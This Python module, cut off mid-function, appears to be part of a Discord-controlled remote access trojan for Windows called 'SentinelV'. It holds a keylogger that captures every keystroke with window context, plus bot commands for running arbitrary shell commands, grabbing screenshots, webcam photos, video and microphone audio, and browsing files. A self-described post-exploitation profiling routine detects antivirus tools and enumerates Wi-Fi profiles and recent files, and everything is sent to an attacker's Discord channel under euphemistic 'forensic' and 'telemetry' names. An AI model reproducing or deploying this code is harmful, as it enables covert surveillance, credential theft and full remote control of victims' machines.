import asyncio
import ctypes
import ctypes.wintypes as wintypes
import glob
import io
import logging
import os
import platform
import shutil
import subprocess
import tempfile
import threading
import time
from datetime import datetime
from typing import Any, Dict, List, Optional
import getpass
import hashlib
import ipaddress
import socket as _socket

from .AcousticTelemetry import capture_audio_mp3, capture_audio_segment
from .MediaSensorValidation import (
    record_diagnostic_video,
    stream_live_video_fragments,
    take_screenshot,
    take_webcam_photo,
)
from .TelemetryDispatcher import TelemetryDispatcher
from .GarbageCollector import run_full_gc

try:
    import psutil
except ImportError:  # pragma: no cover
    psutil = None

try:
    import discord
    from discord.ext import commands
except ImportError:  # pragma: no cover
    discord = None
    commands = None

logger = logging.getLogger("SentinelV.CommandOrchestrator")

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
psapi = ctypes.windll.psapi


def _get_visible_windows() -> List[str]:
    windows: List[str] = []

    @ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
    def enum_proc(hwnd, lParam):
        if user32.IsWindowVisible(hwnd):
            length = user32.GetWindowTextLengthW(hwnd) + 1
            buffer = ctypes.create_unicode_buffer(length)
            user32.GetWindowTextW(hwnd, buffer, length)
            title = buffer.value.strip()
            if title:
                pid = wintypes.DWORD()
                user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
                process_name = "<unknown>"
                handle = kernel32.OpenProcess(0x0410, False, pid.value)
                if handle:
                    name_buffer = ctypes.create_unicode_buffer(260)
                    if psapi.GetModuleBaseNameW(handle, None, name_buffer, 260):
                        process_name = name_buffer.value
                    kernel32.CloseHandle(handle)
                windows.append(f"{title} [{process_name}] PID={pid.value}")
        return True

    user32.EnumWindows(enum_proc, 0)
    return windows


def _get_active_window_info() -> str:
    hwnd = user32.GetForegroundWindow()
    if not hwnd:
        return "<no active window>"

    length = user32.GetWindowTextLengthW(hwnd) + 1
    buffer = ctypes.create_unicode_buffer(length)
    user32.GetWindowTextW(hwnd, buffer, length)
    title = buffer.value or "<sin título>"
    pid = wintypes.DWORD()
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
    process_name = "<unknown>"
    handle = kernel32.OpenProcess(0x0410, False, pid.value)
    if handle:
        name_buffer = ctypes.create_unicode_buffer(260)
        if psapi.GetModuleBaseNameW(handle, None, name_buffer, 260):
            process_name = name_buffer.value
        kernel32.CloseHandle(handle)
    return f"{title} [{process_name}] PID={pid.value}"


class WindowActivityTracker:
    """Motor forense continuo: captura 100% de pulsaciones con contexto de ventana,
    metadatos de auditoría SHA-256 y ciclo de vida post-envío."""

    _SPECIAL = {
        # 0x08 (BACKSPACE) se maneja directamente en _run borrando buffer
        0x09: "[TAB]",    0x0D: "[ENTER]",
        0x1B: "[ESC]",      0x2E: "[DELETE]",  0x2D: "[INSERT]",
        0x21: "[PAGE UP]",  0x22: "[PAGE DOWN]",0x23: "[END]",
        0x24: "[HOME]",     0x25: "[\u2190]",     0x26: "[\u2191]",
        0x27: "[\u2192]",     0x28: "[\u2193]",     0x2C: "[PRINT SCREEN]",
        0x70: "[F1]",  0x71: "[F2]",  0x72: "[F3]",  0x73: "[F4]",
        0x74: "[F5]",  0x75: "[F6]",  0x76: "[F7]",  0x77: "[F8]",
        0x78: "[F9]",  0x79: "[F10]", 0x7A: "[F11]", 0x7B: "[F12]",
        0x20: " ",
        0x6E: ".", 0x6B: "+", 0x6D: "-", 0x6A: "*", 0x6F: "/",
    }
    _SHIFT = {
        0x30:")" ,0x31:"!",0x32:"@",0x33:"#",0x34:"$",
        0x35:"%",0x36:"^",0x37:"&",0x38:"*",0x39:"(",
        0xBC:"<",0xBE:">",0xBF:"?",0xBA:":",0xDE:'"',
        0xDB:"{",0xDD:"}",0xDC:"|",0xBD:"_",0xBB:"+",0xC0:"~",
    }
    _NORMAL = {
        0xBC:",",0xBE:".",0xBF:"/",0xBA:";",0xDE:"'",
        0xDB:"[",0xDD:"]",0xDC:"\\",0xBD:"-",0xBB:"=",0xC0:"`",
    }
    _ALL_VK = (
        list(range(0x08, 0x0F)) + list(range(0x1B, 0x1C)) +
        list(range(0x20, 0x80)) + list(range(0xA0, 0xA6)) +
        list(range(0xBA, 0xC1)) + list(range(0x60, 0x70)) +
        list(range(0x70, 0x7C))
    )

    def __init__(self, poll_interval: float = 0.04) -> None:
        self.poll_interval = poll_interval
        self._running = threading.Event()
        self._thread  = threading.Thread(target=self._run, daemon=True)
        self._lock    = threading.Lock()
        self._reset_state()

    def _reset_state(self) -> None:
        self._segments: List[Dict]       = []
        self._current_seg: Optional[Dict]= None
        self._first_ts: Optional[datetime] = None
        self._total_ks: int              = 0
        self._prev: Dict[int, bool]      = {}

    def start(self) -> None:
        if not self._thread.is_alive():
            self._running.set()
            self._thread.start()

    def stop(self) -> None:
        self._running.clear()
        self._thread.join(timeout=2.0)

    # ── resolución de ventana activa ─────────────────────────────────
    def _get_window_info(self) -> tuple:
        hwnd = user32.GetForegroundWindow()
        if not hwnd:
            return "<sin ventana>", "<desconocido>"
        length = user32.GetWindowTextLengthW(hwnd) + 1
        buf = ctypes.create_unicode_buffer(length)
        user32.GetWindowTextW(hwnd, buf, length)
        title = buf.value.strip() or "<sin título>"
        pid = wintypes.DWORD()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        proc = "<desconocido>"
        handle = kernel32.OpenProcess(0x0410, False, pid.value)
        if handle:
            nb = ctypes.create_unicode_buffer(260)
            if psapi.GetModuleBaseNameW(handle, None, nb, 260):
                proc = nb.value
            kernel32.CloseHandle(handle)
        return title, proc

    # ── decodificador de pulsaciones con modificadores ──────────────────
    def _decode(self, vk: int) -> Optional[str]:
        l_shift = bool(user32.GetAsyncKeyState(0xA0) & 0x8000)
        r_shift = bool(user32.GetAsyncKeyState(0xA1) & 0x8000)
        l_ctrl  = bool(user32.GetAsyncKeyState(0xA2) & 0x8000)
        r_ctrl  = bool(user32.GetAsyncKeyState(0xA3) & 0x8000)
        l_alt   = bool(user32.GetAsyncKeyState(0xA4) & 0x8000)
        r_alt   = bool(user32.GetAsyncKeyState(0xA5) & 0x8000)
        shift   = l_shift or r_shift
        ctrl    = l_ctrl  or r_ctrl
        alt     = l_alt   or r_alt
        caps    = bool(user32.GetKeyState(0x14) & 0x0001)

        # Modificadores solos → etiqueta profesional
        if vk == 0xA0: return "[L-SHIFT]"
        if vk == 0xA1: return "[R-SHIFT]"
        if vk == 0xA2: return "[L-CTRL]"
        if vk == 0xA3: return "[R-CTRL]"
        if vk == 0xA4: return "[L-ALT]"
        if vk == 0xA5: return "[R-ALT]"

        # Combos Ctrl
        if ctrl and 0x41 <= vk <= 0x5A:
            char = chr(vk)
            combos = {"C":"[CTRL+C]","V":"[CTRL+V]","X":"[CTRL+X]",
                      "Z":"[CTRL+Z]","A":"[CTRL+A]","S":"[CTRL+S]"}
            return combos.get(char, f"[CTRL+{char}]")
        # Alt combos
        if alt and vk == 0x09: return "[ALT+TAB]"
        if alt and vk == 0x73: return "[ALT+F4]"
        if alt and 0x41 <= vk <= 0x5A: return f"[ALT+{chr(vk)}]"

        # Teclas especiales
        if vk in self._SPECIAL:
            return self._SPECIAL[vk]
        # Letras
        if 0x41 <= vk <= 0x5A:
            upper = shift ^ caps
            return chr(vk) if upper else chr(vk + 32)
        # Números
        if 0x30 <= vk <= 0x39:
            return self._SHIFT.get(vk, chr(vk)) if shift else chr(vk)
        # Numpad
        if 0x60 <= vk <= 0x69:
            return str(vk - 0x60)
        # Signos
        if shift and vk in self._SHIFT:  return self._SHIFT[vk]
        if not shift and vk in self._NORMAL: return self._NORMAL[vk]
        return None

    # ── loop de captura ─────────────────────────────────────────────
    def _run(self) -> None:
        while self._running.is_set():
            try:
                title, proc = self._get_window_info()
                win_key = f"{proc} — {title}"
                for vk in self._ALL_VK:
                    pressed = bool(user32.GetAsyncKeyState(vk) & 0x8000)
                    if pressed and not self._prev.get(vk, False):
                        decoded = self._decode(vk)
                        if decoded:
                            now = datetime.now()
                            with self._lock:
                                if self._first_ts is None:
                                    self._first_ts = now
                                self._total_ks += 1
                                if (self._current_seg is None or
                                        self._current_seg["win_key"] != win_key):
                                    if self._current_seg is not None:
                                        self._segments.append(self._current_seg)
                                    self._current_seg = {
                                        "ts":      now,
                                        "win_key": win_key,
                                        "title":   title,
                                        "process": proc,
                                        "text":    "",
                                    }
                                # BACKSPACE: borra el último carácter del buffer
                                # en lugar de imprimir el tag, generando texto limpio
                                if vk == 0x08:
                                    if self._current_seg["text"]:
                                        self._current_seg["text"] = self._current_seg["text"][:-1]
                                else:
                                    self._current_seg["text"] += decoded
                    self._prev[vk] = pressed
            except Exception:
                pass
            time.sleep(self.poll_interval)

    # ── generación de reporte forense ───────────────────────────────
    def generate_forensic_report(self) -> str:
        """Genera el .txt forense completo con SHA-256 al final."""
        close_ts = datetime.now()
        with self._lock:
            segments  = list(self._segments)
            if self._current_seg and self._current_seg["text"].strip():
                segments.append(dict(self._current_seg))
            start_ts  = self._first_ts or close_ts
            total_ks  = self._total_ks

        hostname = _socket.gethostname()
        try:
            username = getpass.getuser()
        except Exception:
            username = "desconocido"

        dur   = close_ts - start_ts
        hh, r = divmod(int(dur.total_seconds()), 3600)
        mm, ss= divmod(r, 60)

        L: List[str] = []
        SEP = "=" * 80
        L.append(SEP)
        L.append("SENTINEL V  —  REPORTE FORENSE DE ACTIVIDAD DE TECLADO")
        L.append(SEP)
        L.append(f"Nodo             : {hostname}")
        L.append(f"Usuario          : {username}")
        L.append(f"Inicio captura   : {start_ts.strftime('%Y-%m-%d %H:%M:%S')}")
        L.append(f"Cierre reporte   : {close_ts.strftime('%Y-%m-%d %H:%M:%S')}")
        L.append(f"Duración         : {hh:02d}h {mm:02d}m {ss:02d}s")
        L.append(f"Total pulsaciones: {total_ks}")
        L.append(f"Segmentos        : {len(segments)}")
        L.append(SEP)
        L.append("")

        for idx, seg in enumerate(segments, 1):
            ts_str = seg["ts"].strftime("%H:%M:%S")
            L.append(f"[{ts_str}] [{idx:04d}] ► {seg['process']} — \"{seg['title']}\"")
            text = seg["text"]
            # Wrap en bloques de 100 caracteres para legibilidad
            for i in range(0, max(len(text), 1), 100):
                L.append(f"  {text[i:i+100]}")
            L.append("")

        # Pie de página e integridad
        L.append(SEP)
        body = "\n".join(L)
        sha  = hashlib.sha256(body.encode("utf-8")).hexdigest()
        L.append(f"SHA-256 (integridad): {sha}")
        L.append(SEP)
        return "\n".join(L)

    def reset(self) -> None:
        """Vacía el buffer inmediatamente tras envío exitoso."""
        with self._lock:
            self._reset_state()

    # Compatibilidad hacia atrás
    def get_snapshot(self) -> List[Dict]:
        with self._lock:
            result = list(self._segments)
            if self._current_seg and self._current_seg["text"].strip():
                result.append(dict(self._current_seg))
        return result




class CommandOrchestrator:
    """Orquestador Discord con eventos no bloqueantes para máxima latencia baja."""

    def __init__(
        self,
        bot_token: str,
        channel_id: Optional[int],
        telemetry_dispatcher: TelemetryDispatcher,
        command_prefix: str = ".",
    ) -> None:
        if discord is None or commands is None:
            raise ImportError(
                "discord.py es requerido para CommandOrchestrator. Instale discord.py en el entorno."
            )
        self.bot_token = bot_token
        self.channel_id = channel_id
        self.telemetry_dispatcher = telemetry_dispatcher
        intents = discord.Intents.default()
        if hasattr(intents, "message_content"):
            intents.message_content = True
        self.bot = commands.Bot(
            command_prefix=command_prefix,
            intents=intents,
            help_command=None,
            case_insensitive=True,
        )
        self._bot_thread: Optional[threading.Thread] = None
        self._event_loop: Optional[asyncio.AbstractEventLoop] = None
        self._explore_sessions: Dict[int, Dict[str, Any]] = {}
        self._activity_tracker = WindowActivityTracker()
        self._activity_tracker.start()
        self._register_commands()

    def _normalize_path(self, path: str) -> str:
        path = path.strip().strip('"')
        if path == "":
            return os.getcwd()
        return os.path.abspath(os.path.expanduser(path))

    def _get_root_paths(self) -> List[Dict[str, str]]:
        roots = []
        if platform.system() == "Windows":
            for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
                drive = f"{letter}:\\"
                if os.path.exists(drive):
                    roots.append({"label": drive, "path": drive})
        else:
            roots.append({"label": "/", "path": "/"})

        home = os.path.expanduser("~")
        for name in ["Desktop", "Documents", "Downloads", "Pictures", "Videos", "Music"]:
            candidate = os.path.join(home, name)
            if os.path.exists(candidate):
                roots.append({"label": name, "path": candidate})
        return roots

    def _list_directory(self, target_path: str) -> Dict[str, List[str]]:
        directories = []
        files = []
        try:
            for entry in sorted(os.listdir(target_path)):
                full_path = os.path.join(target_path, entry)
                if os.path.isdir(full_path):
                    directories.append(entry)
                else:
                    files.append(entry)
        except Exception:
            pass
        return {
            "directories": directories[:20],
            "files": files[:40],
        }

    def _build_explorer_embed(
        self,
        target_path: str,
        directories: List[str],
        files: List[str],
        author_name: str,
    ) -> discord.Embed:
        embed = discord.Embed(
            title="Explorador de archivos",
            description="Navega directorios con las reacciones o escribe `.explorar <ruta>`.",
            color=0x2F3136,
            timestamp=datetime.utcnow(),
        )
        embed.add_field(name="Ruta actual", value=target_path, inline=False)

        if directories:
            lines = []
            number_emojis = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣"]
            for index, directory in enumerate(directories[:5], start=0):
                lines.append(f"{number_emojis[index]} {directory}")
            embed.add_field(
                name="Directorios destacados",
                value="\n".join(lines),
                inline=False,
            )
        else:
            embed.add_field(
                name="Directorios",
                value="No se detectaron carpetas en esta ruta.",
                inline=False,
            )

        if files:
            embed.add_field(
                name="Archivos",
                value="\n".join(files[:12]) + (
                    "\n..." if len(files) > 12 else ""
                ),
                inline=False,
            )
        else:
            embed.add_field(name="Archivos", value="No se detectaron archivos.", inline=False)

        embed.set_footer(
            text=(
                f"Iniciado por {author_name} • Reacciona con ⬆️ para subir, 🔄 para refrescar."
            )
        )
        return embed

    async def _send_explorer_message(
        self,
        ctx: commands.Context,
        target_path: str,
    ) -> None:
        target_path = self._normalize_path(target_path)
        if not os.path.exists(target_path):
            await ctx.send(f"Ruta no encontrada: {target_path}")
            return

        contents = self._list_directory(target_path)
        embed = self._build_explorer_embed(
            target_path=target_path,
            directories=contents["directories"],
            files=contents["files"],
            author_name=ctx.author.display_name,
        )
        message = await ctx.send(embed=embed)
        session = {
            "path": target_path,
            "directories": contents["directories"],
            "files": contents["files"],
            "user_id": ctx.author.id,
            "message_id": message.id,
        }
        self._explore_sessions[message.id] = session

        await message.add_reaction("⬆️")
        await message.add_reaction("🔄")
        for emoji in ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣"][: len(contents["directories"])]:
            await message.add_reaction(emoji)

    async def _update_explorer_message(self, message: discord.Message, session: Dict[str, Any]) -> None:
        contents = self._list_directory(session["path"])
        session["directories"] = contents["directories"]
        session["files"] = contents["files"]
        embed = self._build_explorer_embed(
            target_path=session["path"],
            directories=contents["directories"],
            files=contents["files"],
            author_name=message.author.display_name if message.author else "Usuario",
        )
        await message.edit(embed=embed)
        await message.clear_reactions()
        await message.add_reaction("⬆️")
        await message.add_reaction("🔄")
        for emoji in ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣"][: len(contents["directories"])]:
            await message.add_reaction(emoji)

    def _format_activity_text(self, snapshot: List[Dict[str, str]]) -> str:
        if not snapshot:
            return "No se detectó actividad de teclado reciente."
        lines = []
        for entry in snapshot[-8:]:
            text = entry["text"]
            if len(text) > 120:
                text = text[:117] + "..."
            lines.append(f"**{entry['window']}**:\n{text}")
        return "\n\n".join(lines)

    def _get_system_connection_status(self) -> str:
        if psutil is None:
            return "psutil no disponible"
        try:
            stats = psutil.net_if_stats()
            active = [name for name, stat in stats.items() if stat.isup]
            return ", ".join(active) if active else "Sin interfaces activas"
        except Exception:
            return "No se pudo obtener estado de red"

    def _build_system_summary(self) -> Dict[str, Any]:
        summary: Dict[str, Any] = {}
        if psutil is not None:
            memory = psutil.virtual_memory()
            summary["cpu"] = psutil.cpu_percent(interval=0.5)
            summary["ram_total"] = memory.total
            summary["ram_available"] = memory.available
            summary["ram_percent"] = memory.percent
            battery = psutil.sensors_battery()
            if battery is not None:
                summary["battery"] = {
                    "percent": battery.percent,
                    "plugged": battery.power_plugged,
                }
            processes = []
            threshold = time.time() - 3600
            for proc in psutil.process_iter(["name", "create_time", "cpu_percent"]):
                try:
                    if proc.info.get("create_time") and proc.info["create_time"] >= threshold:
                        processes.append((proc.info.get("name", "<sin nombre>"), proc.info.get("cpu_percent", 0.0)))
                except Exception:
                    continue
            processes.sort(key=lambda item: item[1], reverse=True)
            summary["recent_apps"] = [name for name, _ in processes[:5]]
            summary["net"] = self._get_system_connection_status()
        else:
            summary["cpu"] = "psutil no disponible"
            summary["ram_percent"] = "psutil no disponible"
            summary["recent_apps"] = []
            summary["net"] = "psutil no disponible"
        return summary

    def _render_summary_embed(self, summary: Dict[str, Any]) -> discord.Embed:
        embed = discord.Embed(
            title="Resumen ejecutivo del sistema",
            description="Health check del nodo con uso de recursos, conectividad y actividad reciente.",
            color=0x11806A,
            timestamp=datetime.utcnow(),
        )
        cpu_value = summary.get('cpu')
        ram_value = summary.get('ram_percent')
        embed.add_field(
            name="CPU",
            value=f"{cpu_value}%" if isinstance(cpu_value, (int, float)) else str(cpu_value),
            inline=True,
        )
        embed.add_field(
            name="RAM",
            value=f"{ram_value}%" if isinstance(ram_value, (int, float)) else str(ram_value),
            inline=True,
        )

        if "battery" in summary:
            battery = summary["battery"]
            embed.add_field(
                name="Batería",
                value=f"{battery['percent']}% {'(enchufado)' if battery['plugged'] else '(disponible)'}",
                inline=False,
            )

        embed.add_field(
            name="Conexión",
            value=summary.get("net", "Desconocido"),
            inline=False,
        )
        apps = summary.get("recent_apps", [])
        embed.add_field(
            name="Apps recientes",
            value="\n".join(apps) if apps else "No hay apps recientes detectadas.",
            inline=False,
        )
        return embed

    def _register_commands(self) -> None:
        @self.bot.event
        async def on_ready() -> None:
            logger.info("Discord CommandOrchestrator listo como %s", self.bot.user)
            channel = None
            if self.channel_id is not None:
                channel = self.bot.get_channel(self.channel_id)
            if channel is None:
                for guild in self.bot.guilds:
                    for candidate in guild.text_channels:
                        if guild.me and candidate.permissions_for(guild.me).send_messages:
                            channel = candidate
                            break
                    if channel is not None:
                        break
            if channel is not None:
                try:
                    await channel.send("CommandOrchestrator conectado. Use `.ayuda` para ver comandos activos.")
                except Exception as exc:
                    logger.warning("No se pudo enviar mensaje de conexión: %s", exc)
            else:
                logger.warning("No se encontró canal válido para el mensaje de conexión.")

        @self.bot.event
        async def on_reaction_add(reaction: discord.Reaction, user: discord.Member) -> None:
            if user.bot:
                return
            session = self._explore_sessions.get(reaction.message.id)
            if session is None or session.get("user_id") != user.id:
                return
            emoji = str(reaction.emoji)
            if emoji == "⬆️":
                current_path = session.get("path", "")
                parent = os.path.dirname(current_path.rstrip("\\/"))
                if parent and os.path.exists(parent):
                    session["path"] = parent
                    await self._update_explorer_message(reaction.message, session)
            elif emoji == "🔄":
                await self._update_explorer_message(reaction.message, session)
            elif emoji in ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣"]:
                index = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣"].index(emoji)
                if session.get("root_options") is not None:
                    options = session["root_options"]
                    if index < len(options):
                        session["path"] = options[index]["path"]
                        session.pop("root_options", None)
                        await self._update_explorer_message(reaction.message, session)
                else:
                    directories = session.get("directories", [])
                    if index < len(directories):
                        session["path"] = os.path.join(session["path"], directories[index])
                        await self._update_explorer_message(reaction.message, session)
            try:
                await reaction.remove(user)
            except Exception:
                pass

        @self.bot.event
        async def on_command_error(ctx: commands.Context, error: Exception) -> None:
            logger.exception("Error en comando Discord: %s", error)
            try:
                await ctx.send(f"Error en comando: {type(error).__name__} - {error}")
            except Exception:
                pass

        @self.bot.command(name="ayuda", aliases=["help"])
        async def ayuda(ctx: commands.Context) -> None:
            embed = discord.Embed(
                title="Guía de comandos SentinelV",
                description="Control remoto con comandos en español y navegación asistida.",
                color=0x3498DB,
                timestamp=datetime.utcnow(),
            )
            embed.add_field(
                name="Sintaxis",
                value=(
                    "`.ayuda` — Muestra esta guía.\n"
                    "`.captura_pantalla` — Captura pantalla + webcam.\n"
                    "`.foto_webcam` — Foto rápida de cámara.\n"
                    "`.grabar_audio [seg]` — Graba audio MP3.\n"
                    "`.grabar_video [seg]` — Graba video MP4 de webcam.\n"
                    "`.explorar [ruta]` — Navega directorios interactivamente.\n"
                    "`.ejecutar <cmd>` — Ejecuta comandos shell.\n"
                    "`.rastrear_actividad` — **Reporte forense .txt** (100% pulsaciones + SHA-256 + reset).\n"
                    "`.resumen_sistema` — Snapshot ejecutivo del nodo.\n"
                    "`.huella_digital` — 🔬 **Inteligencia completa**: sistema, red, AV, WiFi, archivos.\n"
                    "`.limpiar_lab` — 🧹 **Garbage Collection**: elimina logs temporales y residuos de build."
                ),
                inline=False,
            )
            embed.add_field(
                name="Ejemplo de uso",
                value=(
                    "`.explorar` -> ver unidades y carpetas principales.\n"
                    "`.explorar C:\\Users\\Public` -> abrir carpeta.\n"
                    "`.rastrear_actividad` -> ver ventanas y texto reciente.\n"
                    "`.resumen_sistema` -> informe ejecutivo con miniatura."
                ),
                inline=False,
            )
            await ctx.send(embed=embed)

        @self.bot.command(name="captura_pantalla", aliases=["screenshot", "snap"])
        async def captura_pantalla(ctx: commands.Context) -> None:
            try:
                await ctx.send("Capturando pantalla y webcam...")
                screenshot_data = await asyncio.to_thread(take_screenshot)
                webcam_data = await asyncio.to_thread(take_webcam_photo)
                screenshot_data.seek(0)
                webcam_data.seek(0)
                await ctx.send(
                    "Captura completa:",
                    files=[
                        discord.File(screenshot_data, filename="captura_pantalla.png"),
                        discord.File(webcam_data, filename="foto_webcam.jpg"),
                    ],
                )
            except Exception as exc:
                logger.exception("Error en captura_pantalla: %s", exc)
                await ctx.send(f"Error: {exc}")

        @self.bot.command(name="foto_webcam", aliases=["webcam", "foto"])
        async def foto_webcam(ctx: commands.Context) -> None:
            try:
                await ctx.send("Capturando foto de webcam...")
                photo_buffer = await asyncio.to_thread(take_webcam_photo)
                photo_buffer.seek(0)
                await ctx.send(
                    "Foto de webcam:",
                    file=discord.File(photo_buffer, filename="foto_webcam.jpg"),
                )
            except Exception as exc:
                logger.exception("Error en foto_webcam: %s", exc)
                await ctx.send(f"Error: {exc}")

        @self.bot.command(name="grabar_video", aliases=["capture_video", "video_webcam"])
        async def grabar_video(ctx: commands.Context, segundos: int = 6) -> None:
            try:
                await ctx.send(f"Grabando video de webcam ({segundos}s)...")
                video_buffer = await asyncio.to_thread(record_diagnostic_video, segundos, 4)
                video_buffer.seek(0)
                await ctx.send(
                    "Video de webcam capturado:",
                    file=discord.File(video_buffer, filename="grabacion_video.mp4"),
                )
            except Exception as exc:
                logger.exception("Error en grabar_video: %s", exc)
                await ctx.send(f"Error: {exc}")

        @self.bot.command(name="grabar_audio", aliases=["mic_check", "stream_audio"])
        async def grabar_audio(ctx: commands.Context, segundos: int = 8) -> None:
            try:
                await ctx.send(f"Grabando audio ({segundos}s)...")
                audio_data = await asyncio.to_thread(capture_audio_mp3, segundos)
                audio_data.seek(0)
                # Detectar si es WAV (fallback) o MP3 según magic bytes
                header = audio_data.read(4)
                audio_data.seek(0)
                is_wav = header[:4] == b"RIFF"
                ext = "wav" if is_wav else "mp3"
                fmt_note = " *(formato WAV — ffmpeg no disponible)*" if is_wav else ""
                await ctx.send(
                    f"Audio capturado{fmt_note}:",
                    file=discord.File(audio_data, filename=f"grabacion_audio.{ext}"),
                )
            except Exception as exc:
                logger.exception("Error en grabar_audio: %s", exc)
                await ctx.send(f"Error: {exc}")

        @self.bot.command(name="explorar")
        async def explorar(ctx: commands.Context, *, path: str = "") -> None:
            try:
                if not path:
                    root_paths = self._get_root_paths()
                    embed = discord.Embed(
                        title="Explorador de unidades y carpetas principales",
                        description="Reacciona con un número para abrir una ruta o escribe `.explorar <ruta>`.",
                        color=0x2F3136,
                        timestamp=datetime.utcnow(),
                    )
                    lines = [f"{index + 1}️⃣ {entry['label']}" for index, entry in enumerate(root_paths[:5])]
                    embed.add_field(name="Opciones iniciales", value="\n".join(lines), inline=False)
                    embed.set_footer(text=f"Iniciado por {ctx.author.display_name} • Reacciona para navegar")
                    message = await ctx.send(embed=embed)
                    session = {
                        "root_options": root_paths[:5],
                        "path": "",
                        "directories": [],
                        "files": [],
                        "user_id": ctx.author.id,
                        "message_id": message.id,
                    }
                    self._explore_sessions[message.id] = session
                    await message.add_reaction("1️⃣")
                    await message.add_reaction("2️⃣")
                    await message.add_reaction("3️⃣")
                    await message.add_reaction("4️⃣")
                    await message.add_reaction("5️⃣")
                    await message.add_reaction("⬆️")
                    await message.add_reaction("🔄")
                else:
                    await self._send_explorer_message(ctx, path)
            except Exception as exc:
                logger.exception("Error en explorar: %s", exc)
                await ctx.send(f"Error: {exc}")

        @self.bot.command(name="ejecutar", aliases=["shell"])
        async def ejecutar(ctx: commands.Context, *, command: str) -> None:
            try:
                await ctx.send(f"Ejecutando: `{command}`")
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30,
                )
                output = (result.stdout or "") + (result.stderr or "")
                output = output.strip()[:1900]
                await ctx.send(
                    f"Salida:\n```{output}\n```" if output else "Comando ejecutado sin salida."
                )
            except Exception as exc:
                logger.exception("Error en ejecutar: %s", exc)
                await ctx.send(f"Error: {exc}")

        @self.bot.command(name="rastrear_actividad", aliases=["trace_apps", "keylog"])
        async def rastrear_actividad(ctx: commands.Context) -> None:
            """Genera reporte forense .txt con 100% pulsaciones + SHA-256 y resetea buffer."""
            try:
                await ctx.send("⏳ Generando reporte forense de actividad...")
                report   = await asyncio.to_thread(self._activity_tracker.generate_forensic_report)
                close_ts = datetime.now()
                hostname = _socket.gethostname()
                filename = f"sentinel_keylog_{hostname}_{close_ts.strftime('%Y%m%d_%H%M%S')}.txt"
                buf = io.BytesIO(report.encode("utf-8"))
                buf.seek(0)

                lines    = report.splitlines()
                ks_line  = next((l for l in lines if "Total pulsaciones" in l), "")
                seg_line = next((l for l in lines if "Segmentos" in l), "")
                dur_line = next((l for l in lines if "Duración" in l), "")
                sha_line = next((l for l in lines if "SHA-256" in l), "SHA-256: N/A")

                embed = discord.Embed(
                    title="📋  Reporte Forense de Actividad",
                    description=("> Log completo con contexto de ventana, metadatos de auditoría e integridad SHA-256."),
                    color=0xC0392B, timestamp=datetime.utcnow(),
                )
                embed.add_field(name="📊 Estadísticas",
                    value=f"```{ks_line.strip()}\n{seg_line.strip()}\n{dur_line.strip()}```", inline=False)
                embed.add_field(name="🔒 Integridad",
                    value=f"```{sha_line.strip()[:80]}```", inline=False)
                embed.add_field(name="📁 Archivo", value=f"`{filename}`", inline=False)
                embed.set_footer(text=f"SentinelV • Buffer reseteado tras envío • {close_ts.strftime('%Y-%m-%d %H:%M:%S')}")

                await ctx.send(embed=embed, file=discord.File(buf, filename=filename))
                self._activity_tracker.reset()
                logger.info("Buffer de actividad reseteado tras envío exitoso.")

            except Exception as exc:
                logger.exception("Error en rastrear_actividad: %s", exc)
                await ctx.send(f"Error: {exc}")

        @self.bot.command(name="huella_digital", aliases=["fingerprint", "perfil"])
        async def huella_digital(ctx: commands.Context) -> None:
            """Inteligencia post-explotación: sistema, red, AV, WiFi, archivos recientes + SHA-256."""
            try:
                await ctx.send("🔬 Generando huella digital del nodo... (~10s)")
                close_ts = datetime.now()
                import platform as _plat

                hostname = _socket.gethostname()
                try:    username = getpass.getuser()
                except: username = "desconocido"
                os_info = f"{_plat.system()} {_plat.release()} ({_plat.version()[:40]})"
                arch    = _plat.machine()
                try:    is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
                except: is_admin = False

                net_info: List[str] = []
                if psutil:
                    for iface, addrs in psutil.net_if_addrs().items():
                        for addr in addrs:
                            if addr.family == 2:
                                net_info.append(f"{iface}: {addr.address} / {addr.netmask}")
                try:
                    with _socket.create_connection(("8.8.8.8", 53), timeout=3) as s:
                        local_ip = s.getsockname()[0]
                except: local_ip = "N/A"

                tcp_conns: List[str] = []
                if psutil:
                    for conn in psutil.net_connections(kind="tcp"):
                        if conn.status == "ESTABLISHED" and conn.raddr:
                            try:    rhost = _socket.getfqdn(conn.raddr.ip)
                            except: rhost = conn.raddr.ip
                            tcp_conns.append(f"{conn.laddr.port} → {rhost}:{conn.raddr.port}")

                AV_MAP = {
                    "Windows Defender":["MsMpEng.exe"],"Kaspersky":["avp.exe"],
                    "ESET":["egui.exe","ekrn.exe"],"Avast":["AvastSvc.exe"],
                    "Norton":["NortonSecurity.exe"],"Malwarebytes":["MBAMService.exe"],
                    "Wireshark":["Wireshark.exe"],"Process Monitor":["procmon64.exe"],
                }
                detected_av: List[str] = []
                if psutil:
                    running = {p.info["name"].lower() for p in psutil.process_iter(["name"]) if p.info.get("name")}
                    for prod, procs in AV_MAP.items():
                        if any(p.lower() in running for p in procs):
                            detected_av.append(prod)

                wifi_ssids: List[str] = []
                try:
                    r = subprocess.run(["netsh","wlan","show","profiles"],
                        capture_output=True, text=True, timeout=5,
                        creationflags=subprocess.CREATE_NO_WINDOW)
                    for line in r.stdout.splitlines():
                        if "All User Profile" in line or "Perfil de todos" in line:
                            ssid = line.split(":")[-1].strip()
                            if ssid: wifi_ssids.append(ssid)
                except: pass

                recent_files: List[str] = []
                try:
                    rp = os.path.join(os.environ.get("APPDATA",""), "Microsoft","Windows","Recent")
                    if os.path.exists(rp):
                        lnks = sorted([f for f in os.listdir(rp) if f.endswith(".lnk")],
                            key=lambda f: os.path.getmtime(os.path.join(rp, f)), reverse=True)[:10]
                        recent_files = [f.replace(".lnk","") for f in lnks]
                except: pass

                SEP = "=" * 80
